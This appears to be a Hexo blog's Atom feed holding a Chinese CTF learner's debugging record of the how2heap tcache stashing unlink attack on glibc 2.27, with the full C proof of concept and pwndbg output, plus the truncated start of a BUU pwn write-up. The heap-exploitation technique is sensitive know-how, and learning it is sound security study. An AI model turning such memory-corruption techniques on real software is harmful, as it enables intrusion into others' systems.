<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>郁涛丶&#39;s Blog</title>
  
  
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2021-09-01T14:47:19.668Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>郁涛丶</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>tcache_stashing_unlink_atack调试记录</title>
    <link href="http://example.com/2021/09/01/tcache_stashing_unlink_atack%E8%B0%83%E8%AF%95/"/>
    <id>http://example.com/2021/09/01/tcache_stashing_unlink_atack%E8%B0%83%E8%AF%95/</id>
    <published>2021-08-31T16:00:00.000Z</published>
    <updated>2021-09-01T14:47:19.668Z</updated>
    
    <content type="html"><![CDATA[<p>代码是how2heap中libc2.27的代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> stack_var[<span class="number">0x10</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> *chunk_lis[<span class="number">0x10</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> *target;</span><br><span class="line"></span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;This file demonstrates the stashing unlink attack on tcache.\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;This poc has been tested on both glibc 2.27 and glibc 2.29.\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;This technique can be used when you are able to overwrite the victim-&gt;bk pointer. Besides, it&#x27;s necessary to alloc a chunk with calloc at least once. Last not least, we need a writable address to bypass check in glibc\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;The mechanism of putting smallbin into tcache in glibc gives us a chance to launch the attack.\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;This technique allows us to write a libc addr to wherever we want and create a fake chunk wherever we need. In this case we&#x27;ll create the chunk on the stack.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// stack_var emulate the fake_chunk we want to alloc to</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Stack_var emulates the fake chunk we want to alloc to.\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;First let&#x27;s write a writeable address to fake_chunk-&gt;bk to bypass bck-&gt;fd = bin in glibc. Here we choose the address of stack_var[2] as the fake bk. Later we can see *(fake_chunk-&gt;bk + 0x10) which is stack_var[4] will be a libc addr after attack.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    stack_var[<span class="number">3</span>] = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(&amp;stack_var[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;You can see the value of fake_chunk-&gt;bk is:%p\n\n&quot;</span>,(<span class="keyword">void</span>*)stack_var[<span class="number">3</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Also, let&#x27;s see the initial value of stack_var[4]:%p\n\n&quot;</span>,(<span class="keyword">void</span>*)stack_var[<span class="number">4</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Now we alloc 9 chunks with malloc.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//now we malloc 9 chunks</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; <span class="number">9</span>;i++)&#123;</span><br><span class="line">        chunk_lis[i] = (<span class="keyword">unsigned</span> <span class="keyword">long</span>*)<span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//put 7 chunks into tcache</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Then we free 7 of them in order to put them into tcache. Carefully we didn&#x27;t free a serial of chunks like chunk2 to chunk9, because an unsorted bin next to another will be merged into one after another malloc.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">3</span>;i &lt; <span class="number">9</span>;i++)&#123;</span><br><span class="line">        <span class="built_in">free</span>(chunk_lis[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;As you can see, chunk1 &amp; [chunk3,chunk8] are put into tcache bins while chunk0 and chunk2 will be put into unsorted bin.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//last tcache bin</span></span><br><span class="line">    <span class="built_in">free</span>(chunk_lis[<span class="number">1</span>]);</span><br><span class="line">    <span class="comment">//now they are put into unsorted bin</span></span><br><span class="line">    <span class="built_in">free</span>(chunk_lis[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">free</span>(chunk_lis[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//convert into small bin</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Now we alloc a chunk larger than 0x90 to put chunk0 and chunk2 into small bin.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0xa0</span>);<span class="comment">// size &gt; 0x90</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//now 5 tcache bins</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Then we malloc two chunks to spare space for small bins. After that, we now have 5 tcache bins and 2 small bins\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Now we emulate a vulnerability that can overwrite the victim-&gt;bk pointer into fake_chunk addr: %p.\n\n&quot;</span>,(<span class="keyword">void</span>*)stack_var);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//change victim-&gt;bck</span></span><br><span class="line">    <span class="comment">/*VULNERABILITY*/</span></span><br><span class="line">    chunk_lis[<span class="number">2</span>][<span class="number">1</span>] = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)stack_var;</span><br><span class="line">    <span class="comment">/*VULNERABILITY*/</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//trigger the attack</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Finally we alloc a 0x90 chunk with calloc to trigger the attack. The small bin preiously freed will be returned to user, the other one and the fake_chunk were linked into tcache bins.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">calloc</span>(<span class="number">1</span>,<span class="number">0x90</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Now our fake chunk has been put into tcache bin[0xa0] list. Its fd pointer now point to next free chunk: %p and the bck-&gt;fd has been changed into a libc addr: %p\n\n&quot;</span>,(<span class="keyword">void</span>*)stack_var[<span class="number">2</span>],(<span class="keyword">void</span>*)stack_var[<span class="number">4</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//malloc and return our fake chunk on stack</span></span><br><span class="line">    target = <span class="built_in">malloc</span>(<span class="number">0x90</span>);   </span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;As you can see, next malloc(0x90) will return the region our fake chunk: %p\n&quot;</span>,(<span class="keyword">void</span>*)target);</span><br><span class="line"></span><br><span class="line">    assert(target == &amp;stack_var[<span class="number">2</span>]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>那么就开始调试吧：</p><p>首先最开始有三个变量</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> info locals</span> </span><br><span class="line">stack_var = &#123;0 &lt;repeats 16 times&gt;&#125;</span><br><span class="line">chunk_lis = &#123;0x0 &lt;repeats 16 times&gt;&#125;</span><br><span class="line">target = 0x7ffff7dde39f &lt;_dl_lookup_symbol_x+319&gt;</span><br><span class="line">__PRETTY_FUNCTION__ = &quot;main&quot;</span><br></pre></td></tr></table></figure><p>之后将stack_var[2]的地址放入了stack_var[3]中的位置：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> info locals</span> </span><br><span class="line">stack_var = &#123;0, 0, 0, 140737488346768, 0 &lt;repeats 12 times&gt;&#125;</span><br><span class="line">chunk_lis = &#123;0x0 &lt;repeats 16 times&gt;&#125;</span><br><span class="line">target = 0x7ffff7dde39f &lt;_dl_lookup_symbol_x+319&gt;</span><br><span class="line">__PRETTY_FUNCTION__ = &quot;main&quot;</span><br></pre></td></tr></table></figure><p>至于为什么这么放，是个很有意思的问题，后面会揭晓，继续往下看：</p><p>再接下来就是连续malloc了9次，并将返回的地址放入了chunk_list中：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> info locals</span> </span><br><span class="line">i = 0</span><br><span class="line">stack_var = &#123;0, 0, 0, 140737488346768, 0 &lt;repeats 12 times&gt;&#125;</span><br><span class="line">chunk_lis = &#123;0x555555757260, 0x555555757300, 0x5555557573a0, 0x555555757440, 0x5555557574e0, 0x555555757580, 0x555555757620, 0x5555557576c0, 0x555555757760, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0&#125;</span><br><span class="line">target = 0x7ffff7dde39f &lt;_dl_lookup_symbol_x+319&gt;</span><br><span class="line">__PRETTY_FUNCTION__ = &quot;main&quot;</span><br></pre></td></tr></table></figure><p>然后将3到8的都free掉，tcache是FILO的，且每个最多放7个：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> bin</span></span><br><span class="line">tcachebins</span><br><span class="line">0xa0 [  6]: 0x555555757760 —▸ 0x5555557576c0 —▸ 0x555555757620 —▸ 0x555555757580 —▸ 0x5555557574e0 —▸ 0x555555757440 ◂— 0x0</span><br><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> info locals</span> </span><br><span class="line">stack_var = &#123;0, 0, 0, 140737488346768, 0 &lt;repeats 12 times&gt;&#125;</span><br><span class="line">chunk_lis = &#123;0x555555757260, 0x555555757300, 0x5555557573a0, 0x555555757440, 0x5555557574e0, 0x555555757580, 0x555555757620, 0x5555557576c0, 0x555555757760, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0&#125;</span><br><span class="line">target = 0x7ffff7dde39f &lt;_dl_lookup_symbol_x+319&gt;</span><br><span class="line">__PRETTY_FUNCTION__ = &quot;main&quot;</span><br></pre></td></tr></table></figure><p>在之后按照1,0,2的顺序free，放入unsorted bin中：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> bin</span></span><br><span class="line">tcachebins</span><br><span class="line">0xa0 [  7]: 0x555555757300 —▸ 0x555555757760 —▸ 0x5555557576c0 —▸ 0x555555757620 —▸ 0x555555757580 —▸ 0x5555557574e0 —▸ 0x555555757440 ◂— 0x0</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x555555757390 —▸ 0x555555757250 —▸ 0x7ffff7dcdca0 (main_arena+96) ◂— 0x555555757390</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure><p>之后申请了0xa0大小的chunk，unsorted中没有这么大的，全部放入smallbin中，然后从top chunk切割：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> bin</span></span><br><span class="line">tcachebins</span><br><span class="line">0xa0 [  7]: 0x555555757300 —▸ 0x555555757760 —▸ 0x5555557576c0 —▸ 0x555555757620 —▸ 0x555555757580 —▸ 0x5555557574e0 —▸ 0x555555757440 ◂— 0x0</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x0</span><br><span class="line">smallbins</span><br><span class="line">0xa0: 0x555555757390 —▸ 0x555555757250 —▸ 0x7ffff7dcdd30 (main_arena+240) ◂— 0x555555757390</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> heap</span></span><br><span class="line">....</span><br><span class="line">...</span><br><span class="line">Free chunk (tcache) | PREV_INUSE</span><br><span class="line">Addr: 0x555555757750</span><br><span class="line">Size: 0xa1</span><br><span class="line">fd: 0x5555557576c0</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE  &lt; == 新申请的0xa0大小的chunk</span><br><span class="line">Addr: 0x5555557577f0</span><br><span class="line">Size: 0xb1</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5555557578a0</span><br><span class="line">Size: 0x20761</span><br></pre></td></tr></table></figure><p>然后是两个malloc(0x90)，从tcache中拿：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> bin</span></span><br><span class="line">tcachebins</span><br><span class="line">0xa0 [  5]: 0x5555557576c0 —▸ 0x555555757620 —▸ 0x555555757580 —▸ 0x5555557574e0 —▸ 0x555555757440 ◂— 0x0</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x0</span><br><span class="line">smallbins</span><br><span class="line">0xa0: 0x555555757390 —▸ 0x555555757250 —▸ 0x7ffff7dcdd30 (main_arena+240) ◂— 0x555555757390</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure><p>stack_var的地址：0x7fffffffde80。</p><p>然后就是这句话：</p><p><code> chunk_lis[2][1] = (unsigned long)stack_var;</code></p><p>就是将stack_var的地址放入chunl_lis[2]所指的地址中</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> <span class="built_in">print</span> chunk_lis[2]</span> </span><br><span class="line"><span class="meta">$</span><span class="bash">4 = (unsigned long *) 0x5555557573a0</span></span><br><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> <span class="built_in">print</span> chunk_lis[2][1]</span> </span><br><span class="line"><span class="meta">$</span><span class="bash">5 = 140737488346752 &lt; = 也就是0x7fffffffde80</span></span><br><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> <span class="built_in">print</span> &amp;chunk_lis[2][1]</span> </span><br><span class="line"><span class="meta">$</span><span class="bash">6 = (unsigned long *) 0x5555557573a8</span></span><br></pre></td></tr></table></figure><p>就是说，将0x7ffff7dcdd30写入了0x5555557573a8中</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> x/16gx 0x555555757390</span></span><br><span class="line">0x555555757390:0x00000000000000000x00000000000000a1</span><br><span class="line">0x5555557573a0:0x00005555557572500x00007fffffffde80</span><br><span class="line">0x5555557573b0:0x00000000000000000x0000000000000000</span><br><span class="line">0x5555557573c0:0x00000000000000000x0000000000000000</span><br><span class="line">0x5555557573d0:0x00000000000000000x0000000000000000</span><br><span class="line">0x5555557573e0:0x00000000000000000x0000000000000000</span><br><span class="line">0x5555557573f0:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555757400:0x00000000000000000x0000000000000000</span><br></pre></td></tr></table></figure><p>也就是说，这么一改将smallbin的链表打乱了：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> bin</span></span><br><span class="line">tcachebins</span><br><span class="line">0xa0 [  5]: 0x5555557576c0 —▸ 0x555555757620 —▸ 0x555555757580 —▸ 0x5555557574e0 —▸ 0x555555757440 ◂— 0x0</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x0</span><br><span class="line">smallbins</span><br><span class="line">0xa0 [corrupted]</span><br><span class="line">FD: 0x555555757390 —▸ 0x555555757250 —▸ 0x7ffff7dcdd30 (main_arena+240) ◂— 0x555555757390</span><br><span class="line">BK: 0x555555757250 —▸ 0x555555757390 —▸ 0x7fffffffde80 —▸ 0x7fffffffde90 ◂— 0x0</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line"><span class="meta">pwndbg&gt;</span></span><br></pre></td></tr></table></figure><p>然后是calloc(1,0x90)</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> bin</span></span><br><span class="line">tcachebins</span><br><span class="line">0xa0 [  7]: 0x7fffffffde90 —▸ 0x5555557573a0 —▸ 0x5555557576c0 —▸ 0x555555757620 —▸ 0x555555757580 —▸ 0x5555557574e0 —▸ 0x555555757440 ◂— 0x0</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x0</span><br><span class="line">smallbins</span><br><span class="line">0xa0 [corrupted]</span><br><span class="line">FD: 0x555555757390 —▸ 0x5555557576c0 ◂— 0x0</span><br><span class="line">BK: 0x7fffffffde90 ◂— 0x0</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>tcache bin 有剩余 (数量小于 <code>TCACHE_MAX_BINS</code> ) 时，同大小的 small bin 会放进 tcache 中 (这种情况可以用 <code>calloc</code> 分配同大小堆块触发，因为 <code>calloc</code> 分配堆块时不从 tcache bin 中选取)。在获取到一个 <code>smallbin</code> 中的一个 chunk 后会如果 tcache 仍有足够空闲位置，会将剩余的 small bin 链入 tcache ，在这个过程中只对第一个 bin 进行了完整性检查，后面的堆块的检查缺失。</p><p>所以，这次calloc的是0x555555757250这个chunk，而0x555555757390和0x7fffffffde80则放入了tcache中。</p><p>也就是说，这时stack_var[2]已经放入了tcache中，那么下次calloc即可得到位于stack的一个chunk：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> bin</span></span><br><span class="line">tcachebins</span><br><span class="line">0xa0 [  6]: 0x5555557573a0 —▸ 0x5555557576c0 —▸ 0x555555757620 —▸ 0x555555757580 —▸ 0x5555557574e0 —▸ 0x555555757440 ◂— 0x0</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x0</span><br><span class="line">smallbins</span><br><span class="line">0xa0 [corrupted]</span><br><span class="line">FD: 0x555555757390 —▸ 0x5555557576c0 ◂— 0x0</span><br><span class="line">BK: 0x7fffffffde90 ◂— 0x0</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure><p>可以看到确实是这样：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> info locals</span> </span><br><span class="line">stack_var = &#123;0, 0, 93824994341792, 0, 140737351834928, 0 &lt;repeats 11 times&gt;&#125;</span><br><span class="line">chunk_lis = &#123;0x555555757260, 0x555555757300, 0x5555557573a0, 0x555555757440, 0x5555557574e0, 0x555555757581, 0x555555757620, 0x5555557576c0, 0x555555757760, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0&#125;</span><br><span class="line">target = 0x7fffffffde90</span><br><span class="line">__PRETTY_FUNCTION__ = &quot;main&quot;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;代码是how2heap中libc2.27的代码&lt;/p&gt;
&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;li</summary>
      
    
    
    
    
    <category term="PWN" scheme="http://example.com/tags/PWN/"/>
    
  </entry>
  
  <entry>
    <title>BUU_PWN刷题_0x30-0x3F</title>
    <link href="http://example.com/2021/07/18/BUU-PWN-0x30-0x3f/"/>
    <id>http://example.com/2021/07/18/BUU-PWN-0x30-0x3f/</id>
    <published>2021-07-17T16:00:00.000Z</published>
    <updated>2021-08-11T11:36:05.782Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="0x30-jarvisoj-level1"><a href="#0x30-jarvisoj-level1" class="headerlink" title="0x30.jarvisoj_level1"></a>0x30.jarvisoj_level1</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">vulnerable_function</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">136</span>]; <span class="comment">// [esp+0h] [ebp-88h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;What&#x27;s this:%p?\n&quot;</span>, buf);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0x100</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>tmd，这题给的题目和平台的题不太一样，正常这道题的exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 